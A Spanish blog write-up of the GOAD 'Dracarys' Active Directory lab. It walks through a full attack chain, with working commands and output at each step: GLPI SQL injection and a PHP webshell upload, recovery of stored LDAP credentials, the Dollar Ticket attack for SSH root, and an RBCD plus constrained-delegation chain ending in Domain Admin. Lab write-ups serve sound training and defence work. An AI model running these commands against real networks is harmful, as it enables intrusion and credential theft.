---
title: "GOAD Dracarys — Writeup"
date: 2026-05-03 00:00:00 +0200
categories: [Writeups, GOAD]
tags: [active-directory, kerberos, glpi, rbcd, delegation, windows-server-2025, dollar-ticket, cve-2025-24799, cve-2025-24801]
image:
  path: /assets/img/posts/goad-dracarys-banner.png
  alt: GOAD Dracarys
---

**Dificultad:** Media-Alta  
**Entorno:** Windows Server 2025 (balerion DC, vhagar servidor) + Ubuntu 24.04 (syrax)  
**Objetivo:** Comprometer el dominio `dracarys.lab` partiendo de acceso a red

---

## Resumen

Dracarys es el lab más reciente de la serie [GOAD](https://github.com/Orange-Cyberdefense/GOAD) creada por [M4yfly](https://x.com/m4yfly). A diferencia de los labs anteriores, este usa Windows Server 2025 — lo que significa que las técnicas clásicas de NTLM relay a LDAP están bloqueadas por defecto. Nada de atajos fáciles.

La cadena de ataque pasa por explotar GLPI, escalar a root en Linux mediante el **Dollar Ticket Attack**, y finalmente comprometer el DC a través de una ingeniosa cadena de delegación Kerberos RBCD + KCD.

---

## Infraestructura

| Host | IP | Rol |
|------|-----|-----|
| balerion.dracarys.lab | 10.10.10.10 | Domain Controller (WS2025) |
| vhagar.dracarys.lab | 10.10.10.11 | Servidor miembro (WS2025) |
| syrax.dracarys.lab | 10.10.10.12 | Linux (Ubuntu 24.04) |

---

## Fase 1: Reconocimiento y explotación de GLPI

Un nmap revela GLPI corriendo en syrax. La versión 10.0.17 es vulnerable a dos CVEs críticos:

- **CVE-2025-24799** — SQLi preauth (blind, basada en tiempo)
- **CVE-2025-24801** — Subida de PHP arbitrario post-auth

Primero extraemos el email del admin y triggereamos un reset de contraseña. Luego extraemos el token de reset via SQLi:

```bash
glpwnme -t http://10.10.10.12/glpi/ -e "CVE_2025_24799" --run \
  sql="SELECT password_forget_token FROM glpi_users WHERE name='glpi'"
```

Después de resetear la contraseña, subimos una webshell PHP usando CVE-2025-24801 — modificando el tipo de documento permitido a `.php` y subiendo nuestro payload.

```
http://10.10.10.12/glpi/files/_tmp/shell.php?cmd=id
```

Shell obtenida como `www-data`. No es bonito, pero funciona.

---

## Fase 2: Credenciales de dominio desde GLPI

Rebuscando en MySQL encontramos la tabla `glpi_authldaps` con las credenciales LDAP cifradas del servidor. GLPI cifra estas credenciales con su propia clave almacenada en `glpicrypt.key`.

Un pequeño script PHP usando la clase `GLPIKey` nos da las credenciales en claro:

```php
$key = new GLPIKey();
echo $key->decrypt($encrypted_password);
// BSno5DP4tjJ4jIu8is3B
```

Primeras credenciales de dominio: **sunfyre@dracarys.lab**

---

## Fase 3: Enumeración con BloodHound

Con credenciales válidas, lanzamos BloodHound y encontramos los caminos de ataque clave:

- `viserion` tiene **WriteSPN** sobre `VHAGAR$`
- `SYRAX$` tiene **delegación constrained** (sin Protocol Transition) hacia `HTTP/arrax` y `HTTP/arrax.dracarys.lab` — que no existe. Ghost SPN.
- `ARRAX$` tiene **RBCD** configurado sobre `SYRAX$` (lo crearemos nosotros)

---

## Fase 4: Dollar Ticket Attack — root en syrax

Esta es la técnica más elegante del lab. El KDC tiene un comportamiento curioso: si busca una cuenta y no la encuentra, vuelve a intentarlo **añadiendo `$` al nombre**.

Esto nos permite hacer lo siguiente:

1. Crear una cuenta de máquina llamada `root$` con una contraseña que controlamos
2. Pedir un TGT para el usuario `root` (sin el `$`)
3. El KDC busca `root`, no lo encuentra, busca `root$` y lo encuentra
4. Emite un TGT con el principal `root@DRACARYS.LAB`
5. SSH a syrax con ese ticket → acceso como root local

```bash
addcomputer.py -computer-name 'root$' -computer-pass 'Password123!' \
  'dracarys.lab/sunfyre:BSno5DP4tjJ4jIu8is3B' -dc-ip 10.10.10.10

getTGT.py -dc-ip 10.10.10.10 'dracarys.lab/root:Password123!'

export KRB5CCNAME=root.ccache
ssh -o GSSAPIAuthentication=yes root@syrax.dracarys.lab
```

Root en syrax. Elegante y perturbador a partes iguales.

---

## Fase 5: Keytab de SYRAX$ y acceso a viserion

Con root en syrax extraemos el keytab de la máquina:

```bash
python3 keytabextract.py /etc/krb5.keytab
```

También encontramos el ticket Kerberos de `viserion` en `/tmp` — generado por un bot en vhagar que se conecta periódicamente a syrax via SSH usando `klink.exe` con credenciales hardcodeadas en `C:\bot_ssh.ps1`.

---

## Fase 6: La cadena RBCD + KCD

Windows Server 2025 bloquea el relay SMB→LDAP clásico gracias al channel binding. Pero hay otro camino.

**El problema:** SYRAX$ tiene delegación constrained sin Protocol Transition hacia `HTTP/arrax.dracarys.lab`. Sin Protocol Transition, los tickets S4U2Self no son forwardables, y S4U2Proxy los rechaza.

**La solución:** RBCD siempre produce tickets forwardables por diseño.

### Paso 1: Añadir Ghost SPN a VHAGAR$

Usando el WriteSPN de viserion, añadimos `HTTP/arrax.dracarys.lab` a VHAGAR$:

```bash
bloodyAD -u viserion -p '<password>' -d dracarys.lab \
  --host balerion.dracarys.lab --dc-ip 10.10.10.10 \
  set object 'VHAGAR$' servicePrincipalName \
  -v 'WSMAN/vhagar.dracarys.lab' -v 'HTTP/arrax' -v 'HTTP/arrax.dracarys.lab'
```

### Paso 2: Crear ARRAX$ y configurar RBCD

```bash
addcomputer.py -computer-name 'ARRAX$' -computer-pass 'Password123!' \
  'dracarys.lab/sunfyre:<password>' -dc-ip 10.10.10.10

rbcd.py -delegate-from 'ARRAX$' -delegate-to 'SYRAX$' \
  -use-ldaps -k -no-pass -action write 'dracarys.lab/SYRAX$' -dc-ip 10.10.10.10
```

### Paso 3: Ticket forwardable via RBCD

```bash
getST.py -spn 'SYRAX$' -impersonate Administrator \
  'dracarys.lab/ARRAX$:Password123!' -dc-ip 10.10.10.10
```

### Paso 4: Encadenar con la delegación constrained de SYRAX$

```bash
export KRB5CCNAME=SYRAX.ccache
getST.py -spn 'HTTP/arrax.dracarys.lab' -impersonate Administrator \
  -k -no-pass \
  -additional-ticket 'Administrator@SYRAX$@DRACARYS.LAB.ccache' \
  'dracarys.lab/SYRAX$' -dc-ip 10.10.10.10
```

### Paso 5: Reescribir el SPN con tgssub

El ticket apunta a `HTTP/arrax.dracarys.lab` pero quien tiene ese SPN es VHAGAR$. Reescribimos:

```bash
tgssub.py -in 'Administrator@HTTP_arrax.dracarys.lab@DRACARYS.LAB.ccache' \
  -out Administrator_winrm.ccache \
  -altservice 'HTTP/vhagar.dracarys.lab'
```

### Paso 6: Acceso a vhagar como Administrator

```bash
export KRB5CCNAME=Administrator_winrm.ccache
evil-winrm -i vhagar.dracarys.lab -r dracarys.lab
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
dracarys\administrator
```

---

## Fase 7: Domain Admin

Desde vhagar encontramos el `bot_ssh.ps1` con las credenciales de viserion, y KeePass corriendo con la contraseña del vault visible en la línea de comandos del proceso.

Abrimos el vault y encontramos las credenciales del Domain Admin `drogon`. Shell como drogon en balerion — el Domain Controller. Dominio comprometido.

```
*Evil-WinRM* PS C:\Users\drogon\Documents> whoami
dracarys\drogon
*Evil-WinRM* PS C:\Users\drogon\Documents> hostname
balerion
```

---

## Técnicas utilizadas

| Técnica | Descripción |
|---------|-------------|
| CVE-2025-24799 | SQLi preauth en GLPI 10.0.17 |
| CVE-2025-24801 | Subida de PHP arbitrario en GLPI |
| Dollar Ticket Attack | Abuso del fallback `$` del KDC para SSH como root |
| Ghost SPN | Delegación hacia un SPN inexistente |
| RBCD + KCD Chain | Bypass de la restricción Protocol Transition usando RBCD para generar tickets forwardables |
| tgssub | Reescritura del SPN del ticket para redirigir la autenticación |
| KeePass Process Leak | Contraseña del vault visible en la línea de comandos del proceso |

---

## Recursos

- [GOAD by Orange-Cyberdefense](https://github.com/Orange-Cyberdefense/GOAD)
- [Dracarys lab — M4yfly](https://mayfly277.github.io/posts/Dracarys-lab/)
- [Dollar Ticket Attack](https://www.semperis.com/blog/dollar-ticket-attack/)
- [RBCD — The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
